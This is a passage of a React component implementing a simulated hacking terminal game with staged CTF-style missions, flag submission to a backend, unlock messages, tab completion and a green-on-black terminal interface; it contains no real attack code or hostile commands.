            const captured = capturedFlags.includes(MISSION_7_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Exploit Backdoor`);
        } else if (missionLevel === 8) {
            newHistory.push("OBJECTIVE: PROCESS FORENSICS");
            newHistory.push("Stop the malicious process.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_8_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Kill Logic Bomb`);
        } else if (missionLevel === 9) {
            newHistory.push("OBJECTIVE: BINARY ANALYSIS");
            newHistory.push("Analyze the captured binary.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_9_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Identify C2 Server`);
        } else if (missionLevel === 10) {
            newHistory.push("OBJECTIVE: SYSTEM HARDENING");
            newHistory.push("Secure the system against future attacks.");
            newHistory.push("Progress:");
            const captured = capturedFlags.includes(MISSION_10_FLAGS[0]);
            newHistory.push(`[${captured ? 'X' : ' '}] Disable Startup Backdoor`);
        } else {
            newHistory.push("ALL MISSIONS COMPLETE.");
            newHistory.push("You have full system access.");
        }
        break;
      case 'submit':
        if (!args[1]) {
          newHistory.push("Usage: submit <flag>");
        } else {
          newHistory.push("Verifying flag...");
          try {
            const res = await fetch('/api/v1/terminal/submit-flag', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ flag: args[1], userID: session?.user?.userID })
            });
            const data = await res.json();
            if (res.ok) {
              setCapturedFlags(prev => [...prev, args[1]]);
              newHistory.push(`SUCCESS: ${data.message}`);
              newHistory.push(`Reward: ${data.reward} Stake`);
              if (data.badge) {
                newHistory.push(`Badge Earned: ${data.badge}`);
              }
              
              // Check for Mission Unlock
              if (BONUS_FLAGS.includes(args[1])) {
                  newHistory.push("------------------------------------------------");
                  newHistory.push("SECRET UNLOCKED: DEVELOPER RECOGNITION");
                  newHistory.push("You have found a hidden easter egg.");
                  newHistory.push("------------------------------------------------");
              } else if (missionLevel === 1) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_1_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(2);
                      unlockMission2();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 1 COMPLETE.");
                      newHistory.push("NEW OBJECTIVE UNLOCKED: OPERATION BLACKOUT.");
                      newHistory.push("CHECK ~/missions FOR DETAILS.");
                      newHistory.push("NEW COMMAND UNLOCKED: decrypt");
                      newHistory.push("------------------------------------------------");
                  }
              } else if (missionLevel === 2 && MISSION_2_FLAGS.includes(args[1])) {
                  setMissionLevel(3);
                  unlockMission3();
                  newHistory.push("------------------------------------------------");
                  newHistory.push("SYSTEM ALERT: MISSION 2 COMPLETE.");
                  newHistory.push("ROOT ACCESS RESTORED.");
                  newHistory.push("NEW OBJECTIVE UNLOCKED: SYSTEM RESTORATION.");
                  newHistory.push("CHECK /usr/local/bin FOR RESTORATION TOOLS.");
                  newHistory.push("NEW COMMANDS UNLOCKED: grep, curl");
                  newHistory.push("------------------------------------------------");
                  setNotification({ open: true, message: "New Commands Unlocked: grep, curl", severity: "success" });
              } else if (missionLevel === 3 && MISSION_3_FLAGS.includes(args[1])) {
                  setMissionLevel(4);
                  unlockMission4();
                  newHistory.push("------------------------------------------------");
                  newHistory.push("SYSTEM ALERT: MISSION 3 COMPLETE.");
                  newHistory.push("SYSTEMS ONLINE.");
                  newHistory.push("NEW OBJECTIVE UNLOCKED: NETWORK DISCOVERY.");
                  newHistory.push("SUSPICIOUS TRAFFIC DETECTED. INVESTIGATE INTERNAL HOSTS.");
                  newHistory.push("HINT: Check /etc/hosts and use 'curl'.");
                  newHistory.push("------------------------------------------------");
              } else if (missionLevel === 4 && MISSION_4_FLAGS.includes(args[1])) {
                  setMissionLevel(5);
                  unlockMission5();
                  newHistory.push("------------------------------------------------");
                  newHistory.push("SYSTEM ALERT: MISSION 4 COMPLETE.");
                  newHistory.push("NETWORK SECURED.");
                  newHistory.push("NEW OBJECTIVE UNLOCKED: INFORMATION GATHERING.");
                  newHistory.push("INTELLIGENCE SUGGESTS HIDDEN DATA IN LEGACY FILES.");
                  newHistory.push("HINT: Search through documents and project files.");
                  newHistory.push("NEW COMMANDS UNLOCKED: crack, unzip");
                  newHistory.push("------------------------------------------------");
                  setNotification({ open: true, message: "New Commands Unlocked: crack, unzip", severity: "success" });
              } else if (missionLevel === 5) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_5_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(6);
                      unlockMission6();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 5 COMPLETE.");
                      newHistory.push("LEGACY DATA SECURED.");
                      newHistory.push("NEW OBJECTIVE UNLOCKED: PRIVILEGE ESCALATION.");
                      newHistory.push("INVESTIGATE THE MISSING TREASURER.");
                      newHistory.push("HINT: Check your inbox.");
                      newHistory.push("NEW COMMANDS UNLOCKED: su, exit");
                      newHistory.push("------------------------------------------------");
                      setNotification({ open: true, message: "New Commands Unlocked: su, exit", severity: "success" });
                  }
              } else if (missionLevel === 6) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_6_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(7);
                      // unlockMission7();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 6 COMPLETE.");
                      newHistory.push("ACCESS GRANTED TO LEDGER.");
                      newHistory.push("SUSPICIOUS TRANSACTIONS CONFIRMED.");
                      newHistory.push("WAITING FOR NEXT UPDATE...");
                      newHistory.push("------------------------------------------------");
                  }
              } else if (missionLevel === 7) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_7_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(8);
                      unlockMission8();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 7 COMPLETE.");
                      newHistory.push("BACKDOOR CLOSED.");
                      newHistory.push("SYSTEM INSTABILITY DETECTED.");
                      newHistory.push("NEW OBJECTIVE UNLOCKED: PROCESS FORENSICS.");
                      newHistory.push("CHECK RUNNING PROCESSES.");
                      newHistory.push("NEW COMMANDS UNLOCKED: ps, kill");
                      newHistory.push("------------------------------------------------");
                      setNotification({ open: true, message: "New Commands Unlocked: ps, kill", severity: "success" });
                  }
              } else if (missionLevel === 8) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_8_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(9);
                      unlockMission9();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 8 COMPLETE.");
                      newHistory.push("LOGIC BOMB DEFUSED.");
                      newHistory.push("MALICIOUS BINARY CAPTURED.");
                      newHistory.push("NEW OBJECTIVE UNLOCKED: BINARY ANALYSIS.");
                      newHistory.push("ANALYZE THE PAYLOAD IN /tmp.");
                      newHistory.push("NEW COMMAND UNLOCKED: strings");
                      newHistory.push("------------------------------------------------");
                      setNotification({ open: true, message: "New Command Unlocked: strings", severity: "success" });
                  }
              } else if (missionLevel === 9) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_9_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(10);
                      unlockMission10();
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 9 COMPLETE.");
                      newHistory.push("C2 SERVER IDENTIFIED.");
                      newHistory.push("FINAL OBJECTIVE UNLOCKED: SYSTEM HARDENING.");
                      newHistory.push("SECURE THE STARTUP SEQUENCE.");
                      newHistory.push("NEW COMMANDS UNLOCKED: chmod, rm");
                      newHistory.push("------------------------------------------------");
                      setNotification({ open: true, message: "New Commands Unlocked: chmod, rm", severity: "success" });
                  }
              } else if (missionLevel === 10) {
                  const stateRes = await fetch('/api/v1/terminal/state');
                  const stateData = await stateRes.json();
                  const captured = stateData.capturedFlags || [];
                  if (MISSION_10_FLAGS.every(f => captured.includes(f))) {
                      setMissionLevel(11);
                      newHistory.push("------------------------------------------------");
                      newHistory.push("SYSTEM ALERT: MISSION 10 COMPLETE.");
                      newHistory.push("THE LAB IS SECURE.");
                      newHistory.push("YOU HAVE COMPLETED ALL MISSIONS.");
                      newHistory.push("THANK YOU FOR PLAYING.");
                      newHistory.push("------------------------------------------------");
                  }
              }

            } else {
              newHistory.push(`ERROR: ${data.error}`);
            }
          } catch (error) {
            newHistory.push("System Error: Could not connect to mainframe.");
          }
        }
        break;
      case 'crittercodes':
        newHistory.push("   _____      _ _   _             _____          _           ");
        newHistory.push("  / ____|    (_) | | |           / ____|        | |          ");
        newHistory.push(" | |     _ __ _| |_| |_ ___ _ __| |     ___   __| | ___ ___  ");
        newHistory.push(" | |    | '__| | __| __/ _ \\ '__| |    / _ \\ / _` |/ _ \\ __| ");
        newHistory.push(" | |____| |  | | |_| ||  __/ |  | |___| (_) | (_| |  __\\__ \\ ");
        newHistory.push("  \\_____|_|  |_|\\__|\\__\\___|_|   \\_____\\___/ \\__,_|\\___|___/ ");
        newHistory.push("                                                             ");
        newHistory.push("You found the secret!");
        newHistory.push("Developed by the CritterCodes Team.");
        newHistory.push("Here is your reward: flag{devs_are_watching}");
        break;
      case '':
        break;
      default:
        newHistory.push(`Command not found: ${command}`);
    }

    setHistory(newHistory);
    setInput('');
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      handleCommand(input);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (historyIndex < commandHistory.length - 1) {
        const newIndex = historyIndex + 1;
        setHistoryIndex(newIndex);
        setInput(commandHistory[newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const newIndex = historyIndex - 1;
        setHistoryIndex(newIndex);
        setInput(commandHistory[newIndex]);
      } else if (historyIndex === 0) {
        setHistoryIndex(-1);
        setInput('');
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      const args = input.split(' ');
      const currentInput = args[args.length - 1];
      
      let commandCompleted = false;

      if (args.length === 1) {
        // Command completion
        const commands = ['help', 'ls', 'cd', 'cat', 'clear', 'whoami', 'submit', 'mission', 'pwd', 'ledger'];
        if (missionLevel >= 2) commands.push('decrypt');
        if (missionLevel >= 3) commands.push('grep', 'curl');
        if (missionLevel >= 5) commands.push('crack', 'unzip');
        if (missionLevel >= 6) commands.push('su', 'exit');
        if (missionLevel >= 8) commands.push('ps', 'kill');
        if (missionLevel >= 9) commands.push('strings');
        if (missionLevel >= 10) commands.push('chmod', 'rm');

        const matches = commands.filter(c => c.startsWith(currentInput));
        if (matches.length === 1) {
          setInput(matches[0] + ' ');
          commandCompleted = true;
        }
      } 
      
      if (!commandCompleted) {
        // File/Directory completion
        let pathPrefix = '';
        let partialName = currentInput;
        
        const lastSlashIndex = currentInput.lastIndexOf('/');
        if (lastSlashIndex !== -1) {
            pathPrefix = currentInput.substring(0, lastSlashIndex);
            partialName = currentInput.substring(lastSlashIndex + 1);
        }

        let targetPathArray;
        if (currentInput.startsWith('/')) {
             // Absolute path
             targetPathArray = pathPrefix.split('/').filter(p => p);
        } else {
             // Relative path
             const relativeParts = pathPrefix ? pathPrefix.split('/').filter(p => p) : [];
             targetPathArray = [...currentPath, ...relativeParts];
        }

        // Simple path resolution for ..
        const resolvedPath = [];
        for (const part of targetPathArray) {
            if (part === '..') {
                if (resolvedPath.length > 0) resolvedPath.pop();
            } else if (part === '.') {
                // ignore
            } else {
                resolvedPath.push(part);
            }
        }

        const dir = getDirectory(resolvedPath);
        let children;
        if (dir === fileSystem) {
            children = fileSystem;
        } else {
            children = dir?.children;
        }

        if (children) {
          const files = Object.keys(children);
          const matches = files.filter(f => f.startsWith(partialName));
          
          if (matches.length === 1) {
            let completion = matches[0];
            // If it's a directory, append a slash
            if (children[completion].type === 'dir') {
                completion += '/';
            }

            let newInputPart;
            if (lastSlashIndex !== -1) {
                newInputPart = currentInput.substring(0, lastSlashIndex + 1) + completion;
            } else {
                newInputPart = completion;
            }

            const newInput = [...args.slice(0, -1), newInputPart].join(' ');
            setInput(newInput);
          } else if (matches.length > 1) {
             // Find common prefix
             const commonPrefix = matches.reduce((prefix, current) => {
                 let i = 0;
                 while (i < prefix.length && i < current.length && prefix[i] === current[i]) {
                     i++;
                 }
                 return prefix.substring(0, i);
             }, matches[0]);

             if (commonPrefix.length > partialName.length) {
                let newInputPart;
                if (lastSlashIndex !== -1) {
                    newInputPart = currentInput.substring(0, lastSlashIndex + 1) + commonPrefix;
                } else {
                    newInputPart = commonPrefix;
                }
                const newInput = [...args.slice(0, -1), newInputPart].join(' ');
                setInput(newInput);
             }
          }
        }
      }
    }
  };

  return (
    <Box
      sx={{
        backgroundColor: '#0d0d0d',
        color: '#00ff00',
        fontFamily: "'Roboto Mono', monospace",
        height: { xs: 'calc(100vh - 140px)', md: '75vh' },
        width: { xs: '100%', md: '90%' },
        maxWidth: { md: '1000px' },
        mx: 'auto',
        my: { xs: 0, md: 2 },
        borderRadius: { xs: '4px', md: '12px' },
        p: 2,
        overflowY: 'auto',
        fontSize: '1rem',
        boxShadow: { md: '0 4px 30px rgba(0, 255, 0, 0.1)' },
        border: '1px solid #333'
      }}
      onClick={() => {
        const selection = window.getSelection();
        if (!selection || selection.toString().length === 0) {
          document.getElementById('terminal-input')?.focus();
        }
      }}
    >
      <Snackbar 
        open={showMobileWarning} 
        autoHideDuration={6000} 
        onClose={() => setShowMobileWarning(false)}
        anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
      >
        <Alert onClose={() => setShowMobileWarning(false)} severity="warning" sx={{ width: '100%' }}>
          For the best hacking experience, use a desktop or rotate your device to landscape mode.
        </Alert>
      </Snackbar>

      {history.map((line, i) => (
        <Typography key={i} component="div" sx={{ whiteSpace: 'pre-wrap', mb: 0.5 }}>
          {line}
        </Typography>
      ))}
      
      <Box sx={{ display: 'flex', alignItems: 'center' }}>
        <Typography sx={{ mr: 1, color: '#00ff00', fontWeight: 'bold' }}>
          {terminalUser}@thelab:{currentPath.length === 0 ? '/' : currentPath.join('/')}{terminalUser === 'root' ? '#' : '$'}
        </Typography>
        <input
          id="terminal-input"
          type={awaitingPassword ? "password" : "text"}
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          style={{
            backgroundColor: 'transparent',
            border: 'none',
            color: '#00ff00',
            fontFamily: "'Roboto Mono', monospace",
            fontSize: '1rem',
            flex: 1,
            outline: 'none'
          }}
          autoFocus
          autoComplete="off"
        />
      </Box>
      <div ref={bottomRef} />
    </Box>
  );
}
